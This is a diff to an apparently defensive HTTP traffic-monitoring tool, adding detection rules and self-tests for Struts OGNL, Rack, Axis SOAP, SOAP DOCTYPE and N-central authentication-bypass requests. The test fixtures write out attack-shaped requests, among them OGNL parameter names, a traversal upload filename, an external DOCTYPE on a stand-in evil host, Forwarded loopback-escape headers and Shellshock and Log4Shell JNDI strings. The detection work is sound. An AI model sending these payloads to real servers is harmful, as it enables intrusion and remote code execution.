@@ -16592,9 +16592,9 @@ def _ssdp_selftest():
 # --------------------------------------------------------------------------
 # Layer 7, cleartext only: once TLS completes the HTTP layer is ciphertext, so SNI /
 # ALPN / JA3 / certificates stay TLS Watch's and Cert Watch's. Engine vendored as
-# python/httpwatch.py (+ httpwatch_selftest.py, 1748 checks; v5); this adapter owns the
+# python/httpwatch.py (+ httpwatch_selftest.py, 2323 checks; v7); this adapter owns the
 # capture (one bounded tcpdump window, -w only, never a probe) and feeds each scapy
-# packet through the engine's own dissect_packet() + HttpWatch.feed(). 42 codes:
+# packet through the engine's own dissect_packet() + HttpWatch.feed(). 49 codes:
 #   A  HTTP/1.x framing ambiguity (request smuggling / desync, HTTP-001..011): one
 #      RFC 9112 grammar engine runs a Content-Length framer and a Transfer-Encoding
 #      framer side by side; HTTP-009 (critical) fires when they end the message at
@@ -16636,6 +16636,11 @@ def _ssdp_selftest():
 #      target, path, query, Basic credentials); bodies are never scanned. A walker that
 #      hits its nesting/expansion cap says so (walker_budget_exceeded), never passes
 #      silently. Pairs with LDAP Watch's JNDI-delivery rule (the LDAP callback leg).
+#      v7: N-central semicolon + Forwarded bypass (HTTP-099, CVE-2026-86206) - a raw ';'
+#      path parameter on the guarded first segment AND a Forwarded for= quoted string with
+#      a backslash escape (Jetty unescapes it to loopback, the app's check fails open);
+#      neither half alone fires (jsessionid paths and quoted IPv6 for= are legitimate),
+#      and a %3B path is deliberately silent (measured: it reaches nothing).
 #   F  (v3) attack-shaped request bodies (dechunked, multipart and urlencoded, every
 #      part decoded every plausible way): React2Shell Flight property-path reference
 #      (HTTP-082, CVE-2025-55182 / CVE-2025-66478), Spring4Shell class.* bean path
@@ -16647,7 +16652,19 @@ def _ssdp_selftest():
 #      non-empty part precedes it (PHP's necessary storage condition). Delivery only:
 #      the torn session write and the deserialization are not on the wire. A bare
 #      serialized scalar is a corroborating counter (php_scalar_record_shape), never an
-#      alert. v4: Exchange ProxyShell / ProxyNotShell
+#      alert. v7 adds three Struts parameter-NAME rules decoded the way the servlet
+#      container and Commons FileUpload do: a parameter overwriting a file-upload property
+#      Struts sets itself (HTTP-093, S2-066/S2-067, CVE-2024-53677 / CVE-2023-50164), an
+#      OGNL opener after an action:/redirect:/redirectAction: prefix (HTTP-094, S2-016,
+#      CVE-2013-2251) and a method: remainder that is not a Java identifier (HTTP-095,
+#      S2-032, CVE-2016-3081); the Rack _method grammar (HTTP-096, Ruby2Shell,
+#      CVE-2026-132825 - warn when not an RFC 9110 token, critical with 0xDF in one of
+#      the 14 growing legacy encodings on a text/plain part); an inbound SOAP Fault
+#      carrying an Axis exceptionName in the position Axis loads it from (HTTP-097,
+#      CVE-2026-90436 - Faults travel server to client, so one in a REQUEST is the
+#      protocol running backwards); and a DOCTYPE in a SOAP request (HTTP-098, no CVE -
+#      both SOAP versions forbid it; critical with an external identifier, never
+#      dereferenced). v4: Exchange ProxyShell / ProxyNotShell
 #      (HTTP-087, CVE-2021-34473 / CVE-2022-41040) - the explicit-logon strip moves an
 #      autodiscover-routed request off the autodiscover handler; keyed on the strip, not
 #      the target, so the re-encoded targets that beat Microsoft's rewrite mitigations
@@ -16904,7 +16921,9 @@ def do_http_watch(interface=None, seconds=20, ports=None, pcap=None, quick=False
     (always redacted), slow-read abuse, the PHP session-cookie memory leak, attack-
     shaped requests (Shellshock, Java4Shell, Struts S2-045 / S2-046, Spring4Shell,
     React2Shell, Exchange ProxyLogon / ProxyShell / ProxyNotShell, SharePoint
-    ToolShell, phpAfterShell, Log4Shell, Text4Shell), Brotli block-switch violations (armed only on a patched host
+    ToolShell, phpAfterShell, Log4Shell, Text4Shell, Struts S2-016 / S2-032 / S2-066 /
+    S2-067, Rack Ruby2Shell, Axis inbound SOAP Fault, SOAP DOCTYPE, N-central
+    Forwarded bypass), Brotli block-switch violations (armed only on a patched host
     libbrotli; see result['brotli']) and h2c / gRPC abuse (Rapid Reset,
     CONTINUATION, HPACK, gRPC header and metadata). Dual-stack. HIGH / CRITICAL
     findings feed Watchtower unless quick or replaying a pcap."""
@@ -16951,12 +16970,13 @@ def do_http_watch(interface=None, seconds=20, ports=None, pcap=None, quick=False
 
 
 def _http_selftest():
-    """Self-test HTTP Watch: the vendored engine's own 1748-check suite, focused
+    """Self-test HTTP Watch: the vendored engine's own 2323-check suite, focused
     smuggling / clean / credential-redaction / WinRM-suppression / HTTP.sys Range
     boundary scenarios, the v3 attack-shaped request rules (Shellshock, Struts
     S2-045, Spring4Shell), the v4 Exchange / SharePoint rules (ProxyLogon,
-    ProxyShell / ProxyNotShell, ToolShell) and the v5 phpAfterShell / Log4Shell /
-    Text4Shell rules, each with a near-miss, Brotli arming, the
+    ProxyShell / ProxyNotShell, ToolShell), the v5 phpAfterShell / Log4Shell /
+    Text4Shell rules and the v7 Struts / Rack / Axis / SOAP / N-central rules, each
+    with a near-miss, Brotli arming, the
     verdict ladder,
     the catalog shape, the Watchtower normalizer, and a Scapy pcap end-to-end leg
     through do_http_watch carrying an IPv6 extension header."""
@@ -17168,6 +17188,109 @@ def _http_selftest():
        any(f.code == 'HTTP-092' and 'CVE-2022-42889' in f.cves
            for f in feed(hdr(b'User-Agent', b'${script:javascript:1}'))))
 
+    # v7: Struts parameter-name rules. HTTP-093 - a field overwriting a property Struts
+    # sets itself for a file part (case variant / OGNL prefix); a lookalike stays silent.
+    def st_mp(parts, target=b'/upload.action'):
+        body = b''.join(b'------sb\r\n' + h + b'\r\n\r\n' + v + b'\r\n' for h, v in parts)
+        body += b'------sb--\r\n'
+        return (b'POST ' + target + b' HTTP/1.1\r\nHost: v\r\nContent-Type: multipart/'
+                b'form-data; boundary=----sb\r\nContent-Length: %d\r\n\r\n'
+                % len(body)) + body
+
+    def st_file(name):
+        return (b'Content-Disposition: form-data; name="' + name
+                + b'"; filename="a.txt"\r\nContent-Type: text/plain', b'DATA')
+
+    def st_field(name, val=b'x'):
+        return (b'Content-Disposition: form-data; name="' + name + b'"', val)
+    ck('http093_struts_upload_override',
+       'HTTP-093' in {f.code for f in feed(st_mp(
+           [st_file(b'Upload'), st_field(b'top.UploadFileName', b'../../x.jsp')]))})
+    ck('http093_lookalike_field_silent',
+       'HTTP-093' not in {f.code for f in feed(st_mp(
+           [st_file(b'doc'), st_field(b'docFileNameHint', b'x')]))})
+
+    def st_q(q):
+        return b'GET /x.action?' + q + b' HTTP/1.1\r\nHost: v\r\n\r\n'
+    ck('http094_struts_redirect_ognl',
+       'HTTP-094' in {f.code for f in feed(st_q(b'redirect:%24%7B%231%7D=1'))})
+    ck('http094_plain_redirect_silent',
+       'HTTP-094' not in {f.code for f in feed(st_q(b'redirect:%2Flogin=1'))}
+       and 'HTTP-094' not in {f.code for f in feed(st_q(b'redirect:%2524%7Bx%7D=1'))})
+    ck('http095_struts_dmi_ognl',
+       'HTTP-095' in {f.code for f in feed(st_q(b'method:%23_memberAccess=1'))})
+    ck('http095_java_identifier_silent',
+       'HTTP-095' not in {f.code for f in feed(st_q(b'method:save=1'))}
+       and 'HTTP-095' not in {f.code for f in feed(st_q(b'method:%24init=1'))})
+
+    # v7: Rack _method grammar (Ruby2Shell) - critical only with 0xDF on a text/plain
+    # part tagged with a growing legacy encoding; a real method name stays silent.
+    def rb(val, ctype=None):
+        h = b'Content-Disposition: form-data; name="_method"'
+        if ctype:
+            h += b'\r\nContent-Type: ' + ctype
+        body = b'------rb\r\n' + h + b'\r\n\r\n' + val + b'\r\n------rb--\r\n'
+        return (b'POST /users/1 HTTP/1.1\r\nHost: rails\r\nContent-Type: multipart/'
+                b'form-data; boundary=----rb\r\nContent-Length: %d\r\n\r\n'
+                % len(body)) + body
+    hits = [f for f in feed(rb(b'\xdf' * 21, b'text/plain; charset=ISO-8859-1'))
+            if f.code == 'HTTP-096']
+    ck('http096_ruby2shell_critical',
+       hits and hits[0].severity == 'critical' and 'CVE-2026-132825' in hits[0].cves)
+    hits = [f for f in feed(rb(b'\xdf' * 21, b'text/plain; charset=ISO-8859-7'))
+            if f.code == 'HTTP-096']
+    ck('http096_flat_encoding_warn_only', hits and hits[0].severity == 'warn')
+    ck('http096_real_method_silent',
+       'HTTP-096' not in {f.code for f in feed(rb(b'PATCH'))}
+       and 'HTTP-096' not in {f.code for f in feed(rb(b'M-SEARCH'))})
+
+    # v7: Axis inbound SOAP Fault (a Fault in a REQUEST) and DOCTYPE in a SOAP request.
+    e11 = 'http://schemas.xmlsoap.org/soap/envelope/'
+
+    def soap(xml):
+        xml = xml.encode()
+        return (b'POST /dms/services/ServerUI HTTP/1.1\r\nHost: nc.corp\r\n'
+                b'Content-Type: text/xml; charset=utf-8\r\nContent-Length: %d\r\n\r\n'
+                % len(xml)) + xml
+
+    def env(inner, prolog=''):
+        return (prolog + '<?xml version="1.0"?>' if not prolog else prolog) + \
+            f'<s:Envelope xmlns:s="{e11}"><s:Body>{inner}</s:Body></s:Envelope>'
+    fault = ('<s:Fault><faultcode>s:Server</faultcode><faultstring>x</faultstring>'
+             '<detail><exceptionName>org.example.Gadget</exceptionName></detail></s:Fault>')
+    ck('http097_axis_inbound_fault',
+       any(f.code == 'HTTP-097' and 'CVE-2026-90436' in f.cves
+           for f in feed(soap(env(fault)))))
+    ck('http097_fault_without_exceptionname_silent',
+       'HTTP-097' not in {f.code for f in feed(soap(env(
+           '<s:Fault><faultcode>s:Server</faultcode><faultstring>x</faultstring>'
+           '</s:Fault>')))})
+    hits = [f for f in feed(soap(env('<ns:p xmlns:ns="urn:x"/>',
+                                     '<!DOCTYPE s:Envelope SYSTEM "http://evil.example/e.dtd">')))
+            if f.code == 'HTTP-098']
+    ck('http098_soap_external_doctype_critical', hits and hits[0].severity == 'critical')
+    ck('http098_escaped_doctype_text_silent',
+       'HTTP-098' not in {f.code for f in feed(soap(env(
+           '<ns:p xmlns:ns="urn:x">&lt;!DOCTYPE x&gt;</ns:p>')))})
+
+    # v7: N-central bypass needs BOTH halves; each half alone is a legitimate look-alike.
+    def nc(target, *hdrs):
+        return (b'GET ' + target + b' HTTP/1.1\r\nHost: nc.corp\r\n'
+                + b''.join(h + b'\r\n' for h in hdrs) + b'\r\n')
+    ck('http099_ncentral_bypass',
+       'HTTP-099' in {f.code for f in feed(nc(b'/dms;x=1/services/ServerUI',
+                                             b'Forwarded: for="12\\7.0.0.1"'))})
+    ck('http099_ipv6_escape',
+       'HTTP-099' in {f.code for f in feed(nc(b'/dms;x=1/services/ServerUI',
+                                             b'Forwarded: for="[::\\1]"'))})
+    ck('http099_one_half_alone_silent',
+       'HTTP-099' not in {f.code for f in feed(nc(b'/dms;jsessionid=ABC/services/ServerUI'))}
+       and 'HTTP-099' not in {f.code for f in feed(nc(
+           b'/dms/services/ServerUI', b'Forwarded: for="12\\7.0.0.1"'))})
+    ck('http099_encoded_semicolon_silent',
+       'HTTP-099' not in {f.code for f in feed(nc(b'/dms%3Bx=1/services/ServerUI',
+                                                 b'Forwarded: for="12\\7.0.0.1"'))})
+
     # Tier G (v3): Brotli arming is always reported; a refused library raises. When
     # the host decoder is patched, a valid br body decodes clean and stays silent.
     _probe, _bst = _http_brotli()
@@ -17206,11 +17329,11 @@ def _http_selftest():
        and _http_verdict([], True) == 'clean'
        and _http_verdict([], False) == 'no-traffic')
 
-    # catalog shape: 42 codes over tiers A-G (v5); every attributed CVE is pinned in
+    # catalog shape: 49 codes over tiers A-G (v7); every attributed CVE is pinned in
     # the catalog with a score; nothing deferred is also attributed.
     attributed = {c for d in hw.FINDING_REGISTRY.values() for c in d.cves}
     ck('catalog_shape',
-       len(hw.FINDING_REGISTRY) == 42
+       len(hw.FINDING_REGISTRY) == 49
        and {d.tier for d in hw.FINDING_REGISTRY.values()}
        == {'A', 'B', 'C', 'D', 'E', 'F', 'G'}
        and all(hw.CVE_CATALOG.get(c, {}).get('score') for c in attributed)
@@ -17224,7 +17347,7 @@ def _http_selftest():
        nrm['severity'] == 'HIGH' and nrm['klass'] == 'EXPOSURE'
        and nrm['src'] == '192.168.1.9' and nrm['code'] == 'HTTP-040')
 
-    # the vendored engine's own full suite (1748 checks). Its counters are module
+    # the vendored engine's own full suite (2323 checks). Its counters are module
     # globals, so reset them first or a second panel run would accumulate; it
     # prints a report, so capture that so do_routing_selftest stays quiet.
     try:
@@ -17254,6 +17377,8 @@ def _http_selftest():
         clean = b'GET / HTTP/1.1\r\nHost: intranet\r\n\r\n'
         shock = (b'GET /cgi-bin/test.cgi HTTP/1.1\r\nHost: nas\r\n'
                  b'Referer: () { :;}; /bin/id\r\n\r\n')
+        ncb = (b'GET /dms;x=1/services/ServerUI HTTP/1.1\r\nHost: nc.corp\r\n'
+               b'Forwarded: for="[::\\1]"\r\n\r\n')
         log4 = (b'GET /api HTTP/1.1\r\nHost: app\r\n'
                 b'X-Api-Version: ${${lower:j}ndi:ldap://203.0.113.7/a}\r\n\r\n')
         toolshell = (b'POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit HTTP/1.1\r\n'
@@ -17272,6 +17397,8 @@ def _http_selftest():
             / TCP(sport=40004, dport=80, flags='PA') / Raw(load=toolshell),
             Ether(**em) / IPv6(src='fd00::32', dst='fd00::7') / IPv6ExtHdrHopByHop()
             / TCP(sport=40005, dport=8080, flags='PA') / Raw(load=log4),
+            Ether(**em) / IPv6(src='fd00::33', dst='fd00::8') / IPv6ExtHdrHopByHop()
+            / TCP(sport=40006, dport=80, flags='PA') / Raw(load=ncb),
         ]
         fd_, pth = _tf.mkstemp(suffix='.pcap', prefix='httpwatch_selftest_')
         _os.close(fd_)
@@ -17296,6 +17423,9 @@ def _http_selftest():
            any(f['code'] == 'HTTP-091' and f['af'] == 'ipv6'
                for f in rr.get('findings', [])))
         ck('pcap_walker_budget_reported', 'walker_budget_exceeded' in rr)
+        ck('pcap_http099_ipv6_exthdr',
+           any(f['code'] == 'HTTP-099' and f['af'] == 'ipv6'
+               for f in rr.get('findings', [])))
         scapy_result = {'ran': True, 'findings': len(rr.get('findings', []))}
     except ImportError as e:
         scapy_result = {'ran': False, 'reason': str(e)}
